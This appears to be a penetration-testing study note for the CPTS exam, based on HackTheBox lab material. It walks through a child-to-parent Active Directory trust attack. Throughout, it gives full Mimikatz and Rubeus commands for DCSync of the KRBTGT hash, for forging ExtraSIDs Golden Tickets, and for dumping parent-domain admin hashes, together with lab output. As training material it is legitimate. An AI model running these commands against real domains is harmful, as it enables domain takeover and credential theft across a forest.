> [!card] Mimikatz — DCSync, SID History & Golden Tickets  
> Credential extraction, Kerberos ticket forging, SID History abuse, and domain-trust attacks.
> 
> > [!code-card] DCSYNC CHILD DOMAIN KRBTGT HASH
> > 
> > ```powershell
> > mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
> > ```
> 
> > [!code-card] CREATE GOLDEN TICKET WITH EXTRASIDS
> > 
> > ```powershell
> > mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
> > ```
> 
> > [!code-card] DCSYNC PARENT DOMAIN USER
> > 
> > ```powershell
> > mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
> > ```
> 
> > [!code-card] DCSYNC AGAINST SPECIFIC DOMAIN
> > 
> > ```powershell
> > mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
> > ```
> 
> [!card] PowerView — Active Directory Domain & Group Enumeration  
> PowerShell-based AD enumeration used to retrieve domain and group SIDs.
> 
> > [!code-card] ENUMERATE CHILD DOMAIN SID
> > 
> > ```powershell
> > Get-DomainSID
> > ```
> 
> > [!code-card] FIND ENTERPRISE ADMINS GROUP SID IN PARENT DOMAIN
> > 
> > ```powershell
> > Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
> > ```
> 
> [!card] Active Directory PowerShell — Enterprise Admin Enumeration  
> Native AD PowerShell cmdlets can also retrieve information such as the parent domain's Enterprise Admins SID.
> 
> > [!code-card] GET ENTERPRISE ADMINS GROUP SID
> > 
> > ```powershell
> > Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
> > ```
> 
> [!card] Mimikatz — SID History / ExtraSIDs Attack  
> Uses the compromised child domain's KRBTGT secret and the parent Enterprise Admins SID to forge a ticket containing an additional privileged SID.
> 
> > [!code-card] START MIMIKATZ
> > 
> > ```powershell
> > mimikatz.exe
> > ```
> 
> > [!code-card] FORGE GOLDEN TICKET WITH ENTERPRISE ADMINS EXTRASID
> > 
> > ```powershell
> > mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
> > ```
> 
> [!card] Rubeus — Golden Ticket / Kerberos Ticket Forging  
> Kerberos tooling that can forge a TGT using the child domain KRBTGT NT hash and an Enterprise Admins ExtraSID.
> 
> > [!code-card] FORGE GOLDEN TICKET WITH EXTRASIDS
> > 
> > ```powershell
> > .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
> > ```
> 
> [!card] klist — Kerberos Ticket Inspection  
> Displays Kerberos tickets currently cached in the Windows session.
> 
> > [!code-card] LIST CACHED KERBEROS TICKETS
> > 
> > ```powershell
> > klist
> > ```
> 
> [!card] PowerShell — SMB / Administrative Share Access  
> Tests whether the current security context can access the parent domain controller's administrative C$ share.
> 
> > [!code-card] TEST ACCESS TO PARENT DOMAIN CONTROLLER
> > 
> > ```powershell
> > ls \\academy-ea-dc01.inlanefreight.local\c$
> > ```
> 
> > [!important] Quick Mental Model  
> > **Child Domain compromise → obtain child KRBTGT hash → obtain child SID → obtain parent Enterprise Admins SID → forge child-domain Golden Ticket → add parent Enterprise Admins SID as ExtraSID → inject ticket → access parent-domain resources.**

# 🔐 Attacking Domain Trusts — Child → Parent Trusts from Windows

> [!info] Core Idea  
> A compromised child domain can potentially be leveraged to compromise the parent domain when the forest's trust relationship respects SID history / ExtraSIDs and appropriate SID filtering protections are not preventing the attack. The technique abuses Kerberos authorization by placing the SID of the parent forest's `Enterprise Admins` group into a forged ticket.

---

## 🧠 1. SID History Primer

The `sidHistory` attribute is primarily intended for **domain migration scenarios**.

When a user is migrated from one domain to another:

1. A new account is created in the destination domain.
    
2. The original user's SID is placed into the new account's `sidHistory`.
    
3. The user's existing access to resources associated with the original SID can therefore continue.
    

### Why SID History Matters

SID history is normally a legitimate migration feature, but it can also be abused.

An attacker using Mimikatz can perform **SID History injection**, causing an account they control to have an additional privileged SID associated with it.

When the user authenticates, the SIDs associated with the account are incorporated into the user's access token.

That token is then used by Windows to determine what resources the account can access.

> [!important] Authorization Mental Model  
> Think of the access token as the collection of security identities Windows uses when deciding what the authenticated principal is allowed to access.
> 
> If a privileged domain SID is effectively represented in that token, Windows can authorize access based on that privileged identity.

---

# 🌳 2. ExtraSIDs Attack

The **ExtraSIDs attack** is used after compromising a **child domain** to target the **parent domain** within the same Active Directory forest.

The key idea is:

```text
Compromise Child Domain
        ↓
Obtain Child KRBTGT Hash
        ↓
Obtain Child Domain SID
        ↓
Obtain Parent Enterprise Admins SID
        ↓
Forge Golden Ticket
        ↓
Add Enterprise Admins SID as ExtraSID
        ↓
Pass the Ticket
        ↓
Access Parent-Domain Resources
```

The source explains that within the same AD forest, `sidHistory` is respected because the relevant SID Filtering protection is not preventing the SID from being honored across the trust.

The attacker therefore creates a Golden Ticket from the compromised child domain containing the SID of the **Enterprise Admins** group in the parent domain.

> [!warning] Critical Requirement  
> This attack depends on the trust relationship and SID filtering behavior. It is not simply a matter of possessing any child-domain credentials.

---

# 📋 3. Information Required for the Attack

After compromising the child domain, the source identifies six pieces of information required:

|Requirement|Example|
|---|---|
|Child-domain KRBTGT hash|`9d765b482771505cbe97411065964d5f`|
|Child-domain SID|`S-1-5-21-2806153819-209893948-922872689`|
|Target username|`hacker`|
|Child-domain FQDN|`LOGISTICS.INLANEFREIGHT.LOCAL`|
|Parent Enterprise Admins SID|`S-1-5-21-3842939050-3880317879-2865463114-519`|
|Target parent domain|`INLANEFREIGHT.LOCAL`|

The target username does not necessarily need to exist in the child domain for the Golden Ticket creation demonstrated in the source.

> [!tip] CPTS Recognition Pattern  
> When you see **child → parent domain compromise**, immediately think:
> 
> **KRBTGT hash + child SID + parent Enterprise Admins SID + Golden Ticket + ExtraSID**

---

# 🔑 4. Obtain the Child KRBTGT NT Hash

The `KRBTGT` account is associated with the Kerberos Key Distribution Center.

Its password-derived secret is used to sign/encrypt Kerberos tickets issued within the domain.

The source notes that possessing the KRBTGT hash allows creation of Kerberos TGTs that can subsequently be used to request TGS tickets for services in the domain.

This is the foundation of the **Golden Ticket** technique.

> [!important] Why KRBTGT Matters  
> A Golden Ticket is fundamentally a forged Kerberos TGT signed using the domain's KRBTGT secret.
> 
> Therefore:
> 
> **KRBTGT hash → ability to forge domain TGTs**

The source also notes that changing the KRBTGT password is the way to invalidate existing Golden Tickets, and recommends doing so periodically and after a penetration test where full domain compromise has occurred.

## DCSync the Child KRBTGT Account

Because the child domain has already been compromised and the attacker has Domain Admin or similar privileges, DCSync can be used to obtain the KRBTGT NT hash.

```powershell
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
```

Relevant output:

```text
[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'LOGISTICS\krbtgt' will be the user account

Object RDN           : krbtgt

SAM Username         : krbtgt
Object Security ID   : S-1-5-21-2806153819-209893948-922872689-502

Credentials:
  Hash NTLM: 9d765b482771505cbe97411065964d5f
```

> [!success] Data Obtained  
> **Child KRBTGT NT hash:**
> 
> `9d765b482771505cbe97411065964d5f`

---

# 🆔 5. Obtain the Child Domain SID

PowerView's `Get-DomainSID` function can retrieve the SID of the child domain.

```powershell
Get-DomainSID
```

Output:

```text
S-1-5-21-2806153819-209893948-922872689
```

The same domain SID can also be identified from the Mimikatz output.

> [!success] Data Obtained  
> **Child domain SID:**
> 
> `S-1-5-21-2806153819-209893948-922872689`

---

# 👑 6. Obtain the Parent Enterprise Admins SID

The next required value is the SID of the **Enterprise Admins** group in the parent/root domain.

PowerView can retrieve it:

```powershell
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

Output:

```text
distinguishedname                                       objectsid
-----------------                                       ---------
CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519
```

The source also gives a native Active Directory PowerShell alternative:

```powershell
Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
```

> [!success] Data Obtained  
> **Parent Enterprise Admins SID:**
> 
> `S-1-5-21-3842939050-3880317879-2865463114-519`

---

# 🧩 7. Assemble the Attack Data

At this point, the source has collected all required values:

```text
Child KRBTGT Hash:
9d765b482771505cbe97411065964d5f

Child Domain SID:
S-1-5-21-2806153819-209893948-922872689

Target User:
hacker

Child Domain FQDN:
LOGISTICS.INLANEFREIGHT.LOCAL

Parent Enterprise Admins SID:
S-1-5-21-3842939050-3880317879-2865463114-519
```

---

# 🚫 8. Establish the Before State

Before creating the Golden Ticket, the source confirms that the compromised child-domain context does **not** have access to the parent domain controller's C$ administrative share.

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```

Result:

```text
ls : Access is denied
```

> [!important] Why This Check Matters  
> This establishes a clear **before/after** condition:
> 
> **Before ticket forging → Access denied**
> 
> **After ticket forging → Parent-domain resource access**

This is useful when validating an attack path during an assessment.

---

# 🎫 9. Create the ExtraSIDs Golden Ticket with Mimikatz

The collected information can now be supplied to Mimikatz.

```powershell
mimikatz.exe
```

Then:

```powershell
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

### 🔍 Breaking Down the Command

|Parameter|Purpose|
|---|---|
|`/user:hacker`|Specifies the identity represented by the forged ticket|
|`/domain:LOGISTICS.INLANEFREIGHT.LOCAL`|Specifies the compromised child domain|
|`/sid:S-1-5-21-2806153819-209893948-922872689`|Child domain SID|
|`/krbtgt:9d765b482771505cbe97411065964d5f`|Child-domain KRBTGT NT hash|
|`/sids:S-1-5-21-3842939050-3880317879-2865463114-519`|Adds the parent Enterprise Admins SID as an ExtraSID|
|`/ptt`|Passes/injects the resulting ticket into the current session|

The generated ticket output shows:

```text
User      : hacker
Domain    : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
SID       : S-1-5-21-2806153819-209893948-922872689
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3842939050-3880317879-2865463114-519
ServiceKey: 9d765b482771505cbe97411065964d5f - rc4_hmac_nt
```

> [!important] The Critical Piece  
> The important part is not merely creating a Golden Ticket.
> 
> The attack specifically places:
> 
> `S-1-5-21-3842939050-3880317879-2865463114-519`
> 
> into the ticket as an **ExtraSID**.
> 
> That SID represents **Enterprise Admins in the parent domain**.

---

# 🔎 10. Verify the Ticket with `klist`

After the ticket has been submitted to the current session, `klist` can confirm that it is present.

```powershell
klist
```

The source shows:

```text
Cached Tickets: (1)

#0> Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
    Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
    KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
```

> [!success] Verification  
> The important observation is that the forged `hacker` TGT is now present in the current Windows session.

---

# 🏰 11. Access the Parent Domain Controller

After the ticket has been injected, the source tests access to the parent domain controller's C$ share again:

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```

This time, the source obtains directory access:

```text
Directory of \\academy-ea-dc01.inlanefreight.local\c$

PerfLogs
Program Files
Program Files (x86)
Shares
Users
Windows
```

> [!success] Attack Result  
> The previously inaccessible parent-domain controller is now accessible using the forged Kerberos ticket.

---

# 🦀 12. ExtraSIDs Attack with Rubeus

The same attack can also be performed using **Rubeus**.

Before running Rubeus, the source again establishes that access is denied:

```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$
```

Result:

```text
ls : Access is denied
```

---

## Rubeus Golden Ticket

The source explains two particularly important parameters:

- `/rc4` — the NT hash of the KRBTGT account.
    
- `/sids` — the SID to add to the forged ticket, giving the ticket the rights associated with the parent Enterprise Admins group.
    

Command:

```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```

### Rubeus Parameters

|Parameter|Meaning|
|---|---|
|`/rc4`|Child KRBTGT NT hash|
|`/domain`|Child domain|
|`/sid`|Child domain SID|
|`/sids`|Parent Enterprise Admins SID added as ExtraSID|
|`/user`|Identity represented by the forged ticket|
|`/ptt`|Import/pass the ticket into the current session|

The resulting output confirms:

```text
[*] Action: Build TGT
[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 9D765B482771505CBE97411065964D5F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL

[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'
```

> [!important] Mimikatz vs Rubeus  
> The underlying attack concept is the same:
> 
> **Child KRBTGT secret + child SID + parent Enterprise Admins SID → forged TGT with ExtraSID**
> 
> The primary difference here is the tooling used to construct and submit the ticket.

---

# 🔎 13. Verify the Rubeus Ticket

Again, `klist` can be used to inspect the current Kerberos cache:

```powershell
klist
```

The source shows:

```text
Cached Tickets: (1)

#0> Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL
    Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL @ LOGISTICS.INLANEFREIGHT.LOCAL
    KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
```

> [!success] Verification  
> The forged `hacker` TGT is present in the Windows Kerberos cache after the Rubeus operation.

---

# 💀 14. Use the Forged Trust to Perform DCSync Against the Parent

Once parent-domain access has been obtained, the source demonstrates DCSync against the parent domain, targeting the `lab_adm` Domain Admin account.

Start Mimikatz:

```powershell
.\mimikatz.exe
```

Then:

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```

The output identifies the parent domain:

```text
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
```

The resulting credentials include:

```text
SAM Username         : lab_adm
Object Security ID   : S-1-5-21-3842939050-3880317879-2865463114-1001

Credentials:
  Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
```

---

# 🌐 15. DCSync When the Target Domain Differs

When the user's domain and the target domain are different, the source states that the exact target domain should be specified.

```powershell
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

The output again identifies:

```text
[DC] 'INLANEFREIGHT.LOCAL' will be the domain
[DC] 'ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL' will be the DC server
[DC] 'INLANEFREIGHT\lab_adm' will be the user account
```

And returns the target account's NT hash:

```text
Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
```

---

# 🧠 16. Full Attack Methodology

> [!card] Child → Parent Trust Attack — Decision Flow  
> Use this mental model when a CPTS assessment reveals a compromised child domain.
> 
> > [!code-card] 1 — COMPROMISE CHILD DOMAIN
> > 
> > ```text
> > Obtain privileged access within the child domain
> > ```
> 
> > [!code-card] 2 — OBTAIN CHILD KRBTGT HASH
> > 
> > ```powershell
> > mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
> > ```
> 
> > [!code-card] 3 — OBTAIN CHILD DOMAIN SID
> > 
> > ```powershell
> > Get-DomainSID
> > ```
> 
> > [!code-card] 4 — OBTAIN PARENT ENTERPRISE ADMINS SID
> > 
> > ```powershell
> > Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
> > ```
> 
> > [!code-card] 5 — FORGE EXTRASIDS GOLDEN TICKET
> > 
> > ```powershell
> > mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
> > ```
> 
> > [!code-card] 6 — VERIFY TICKET
> > 
> > ```powershell
> > klist
> > ```
> 
> > [!code-card] 7 — TEST PARENT ACCESS
> > 
> > ```powershell
> > ls \\academy-ea-dc01.inlanefreight.local\c$
> > ```
> 
> > [!code-card] 8 — DCSYNC PARENT
> > 
> > ```powershell
> > mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
> > ```

---

# 🗺️ 17. CPTS Mental Model

```text
                 ACTIVE DIRECTORY FOREST
                         │
             ┌───────────┴───────────┐
             │                       │
       ROOT / PARENT             CHILD DOMAIN
     INLANEFREIGHT.LOCAL    LOGISTICS.INLANEFREIGHT.LOCAL
             │                       │
     Enterprise Admins          Compromised
             │                       │
             │                 KRBTGT HASH
             │                       │
             │                 CHILD SID
             │                       │
             └───────────┬───────────┘
                         │
                  EXTRA SID ATTACK
                         │
                  Forged Golden TGT
                         │
                  Enterprise Admins
                     ExtraSID
                         │
                         ▼
                Parent-Domain Access
                         │
                         ▼
                      DCSync
                         │
                         ▼
                Parent Credentials
```

> [!important] The Key Relationship  
> The attack is not simply:
> 
> **"I compromised a child, therefore I am automatically Domain Admin in the parent."**
> 
> Instead:
> 
> **Child compromise gives the attacker the material needed to forge authentication that is accepted across the trust, with a privileged parent-domain SID represented through the ticket.**

---

# ⚠️ 18. Important Technical Distinctions

### SID vs SID History vs ExtraSID

|Concept|Meaning|
|---|---|
|**SID**|Security Identifier representing a security principal/domain/group/user|
|**SID History**|AD attribute used to retain previous SIDs during migrations|
|**ExtraSID / `/sids`**|Additional SID inserted into the forged Kerberos ticket in this attack|
|**KRBTGT hash**|Secret used to forge valid-looking Kerberos TGTs|
|**Golden Ticket**|Forged Kerberos TGT|
|**DCSync**|Technique used to request directory replication data, including password hashes, from a DC|

---

# 🔐 19. Why the KRBTGT Hash Is the Critical Secret

The source describes the KRBTGT account as the service account for the Kerberos KDC.

Its password is used by domain controllers to validate Kerberos tickets.

Therefore:

```text
KRBTGT Secret
      ↓
Ability to forge TGT
      ↓
Ticket can represent chosen identity
      ↓
ExtraSID can represent additional privileged SID
      ↓
Trust relationship may accept authorization
```

The source specifically notes that the KRBTGT account's password must be changed to invalidate Golden Tickets.

---

# 🧪 20. Before vs After

|Stage|Parent DC C$ Access|
|---|---|
|Compromised child-domain context|❌ Access denied|
|After Mimikatz ExtraSIDs ticket|✅ Access granted|
|After Rubeus ExtraSIDs ticket|Ticket imported and available for access|
|After parent-domain access|DCSync demonstrated against parent|

The source explicitly demonstrates the initial access-denied state and subsequent successful C$ access after ticket creation.

---

# 🧠 21. What to Look for During a CPTS Assessment

When you compromise a domain and discover that it is a **child domain**, don't immediately stop at the child domain.

Think:

```text
Is this domain a child?
        ↓
What is the parent/root domain?
        ↓
Can I obtain privileged access in the child?
        ↓
Can I obtain the child KRBTGT hash?
        ↓
What is the child SID?
        ↓
What is the parent Enterprise Admins SID?
        ↓
Does the trust/SID filtering configuration permit this path?
        ↓
Can an ExtraSID Golden Ticket be created?
        ↓
Can the forged ticket access parent resources?
        ↓
Can parent-domain DCSync be performed?
```

> [!tip] Exam Trigger  
> **Child Domain + KRBTGT + Enterprise Admins SID = investigate ExtraSIDs.**

---

# 📌 22. Command Reference by Assessment Phase

> [!card] Phase 1 — Gather Child-Domain Information  
> Identify the secrets and identifiers required to construct the attack.
> 
> > [!code-card] DCSYNC CHILD KRBTGT
> > 
> > ```powershell
> > mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
> > ```
> 
> > [!code-card] ENUMERATE CHILD SID
> > 
> > ```powershell
> > Get-DomainSID
> > ```

> [!card] Phase 2 — Gather Parent-Domain Information  
> Identify the privileged SID in the parent domain.
> 
> > [!code-card] ENUMERATE ENTERPRISE ADMINS SID
> > 
> > ```powershell
> > Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
> > ```
> 
> > [!code-card] NATIVE AD ALTERNATIVE
> > 
> > ```powershell
> > Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
> > ```

> [!card] Phase 3 — Validate Current Access  
> Establish that the child-domain context cannot currently access the parent DC.
> 
> > [!code-card] TEST PARENT C$ ACCESS
> > 
> > ```powershell
> > ls \\academy-ea-dc01.inlanefreight.local\c$
> > ```

> [!card] Phase 4 — Forge the Ticket  
> Construct the Golden Ticket containing the parent Enterprise Admins SID.
> 
> > [!code-card] MIMIKATZ EXTRASIDS GOLDEN TICKET
> > 
> > ```powershell
> > mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
> > ```
> 
> > [!code-card] RUBEUS EXTRASIDS GOLDEN TICKET
> > 
> > ```powershell
> > .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
> > ```

> [!card] Phase 5 — Verify Kerberos State  
> Confirm that the forged ticket is present in the current session.
> 
> > [!code-card] LIST KERBEROS TICKETS
> > 
> > ```powershell
> > klist
> > ```

> [!card] Phase 6 — Validate Parent Access  
> Confirm that the forged authorization context provides access to parent resources.
> 
> > [!code-card] ACCESS PARENT DC ADMINISTRATIVE SHARE
> > 
> > ```powershell
> > ls \\academy-ea-dc01.inlanefreight.local\c$
> > ```

> [!card] Phase 7 — DCSYNC PARENT  
> Once parent-domain privileges have been obtained, demonstrate directory replication access.
> 
> > [!code-card] DCSYNC PARENT USER
> > 
> > ```powershell
> > mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
> > ```
> 
> > [!code-card] DCSYNC SPECIFIC PARENT DOMAIN
> > 
> > ```powershell
> > mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
> > ```

---

# 📝 23. Key Takeaways

> [!success] Remember These
> 
> - `sidHistory` exists primarily to preserve access during domain migrations.
>     
> - SID History can be abused to represent additional security identities.
>     
> - The **ExtraSIDs attack** can leverage a compromised child domain to target the parent domain.
>     
> - The attack requires the **child-domain KRBTGT hash**.
>     
> - The **child-domain SID** is required to construct the ticket.
>     
> - The **parent Enterprise Admins SID** is used as the privileged ExtraSID.
>     
> - The target username used for the forged ticket does not necessarily need to exist.
>     
> - Mimikatz and Rubeus can both construct the demonstrated Golden Ticket.
>     
> - `/sids` is the critical parameter for adding the parent privileged SID.
>     
> - `/ptt` passes the resulting ticket into the current session.
>     
> - `klist` verifies the Kerberos ticket cache.
>     
> - Access to the parent DC's C$ share provides a practical before/after validation.
>     
> - Once parent-domain access is achieved, the source demonstrates DCSync against a parent-domain account.
>     
> - When targeting a different domain with DCSync, specify `/domain:<TARGET-DOMAIN>`.
>     
> - Changing the KRBTGT password is the mechanism described by the source for invalidating Golden Tickets.
>     

---

# 🎯 24. Final CPTS Cheat Sheet

```text
CHILD DOMAIN COMPROMISED
        │
        ├── Get KRBTGT hash
        │     └── lsadump::dcsync /user:<child>\krbtgt
        │
        ├── Get child SID
        │     └── Get-DomainSID
        │
        ├── Get parent Enterprise Admins SID
        │     └── Get-DomainGroup ... | select distinguishedname,objectsid
        │
        ├── Confirm parent access is unavailable
        │     └── ls \\<parent-dc>\c$
        │
        ├── Forge Golden Ticket
        │     └── kerberos::golden ... /sids:<Enterprise-Admins-SID> /ptt
        │
        ├── Verify ticket
        │     └── klist
        │
        ├── Re-test parent access
        │     └── ls \\<parent-dc>\c$
        │
        └── Demonstrate parent compromise
              └── lsadump::dcsync /user:<parent>\<user> /domain:<parent>
```

> [!important] One-Line Mental Model  
> **Compromised child → child KRBTGT → child SID → parent Enterprise Admins SID → ExtraSID Golden Ticket → Pass the Ticket → parent access → DCSync.**

> [!warning] Assessment Context  
> The commands and attack flow above are reproduced from the supplied HTB material and should be understood within an authorized lab or penetration-testing engagement. The source's demonstrated result is specifically a child-to-parent Active Directory trust attack using ExtraSIDs.